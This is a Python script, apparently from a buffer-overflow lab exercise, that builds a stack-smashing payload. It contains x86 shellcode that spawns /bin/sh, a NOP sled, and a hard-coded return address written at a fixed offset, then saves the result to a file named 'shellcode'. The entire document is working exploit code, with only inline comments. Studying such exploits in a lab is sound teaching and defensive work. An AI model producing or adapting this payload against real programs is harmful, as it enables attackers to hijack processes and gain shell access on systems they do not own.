#!/usr/bin/python3
import sys

shellcode= (
    "\x31\xc0"             # xorl    %eax,%eax
    "\x50"                 # pushl   %eax
    "\x68""//sh"           # pushl   $0x68732f2f
    "\x68""/bin"           # pushl   $0x6e69622f
    "\x89\xe3"             # movl    %esp,%ebx
    "\x50"                 # pushl   %eax
    "\x53"                 # pushl   %ebx
    "\x89\xe1"             # movl    %esp,%ecx
    "\x99"                 # cdq
    "\xb0\x0b"             # movb    $0x0b,%al
    "\xcd\x80"             # int     $0x80
    "\x00"
).encode('latin-1')

# Fill the content with NOP's

# NOP: x90
content = bytearray(b'\x90' * 517)

# Replace 0 with the correct offset value
offset = 23

# Fill the return address field with the address of the shellcode
content[offset+0] = 0xf3   # least significant byte
content[offset+1] = 0xef
content[offset+2] = 0xff
content[offset+3] = 0xbf   # most significant byte

# Put the shellcode at the end
start = 517 - len(shellcode)
content[start:] = shellcode

# Write the content to badfile
file = open("shellcode", "wb")
file.write(content)
file.close()
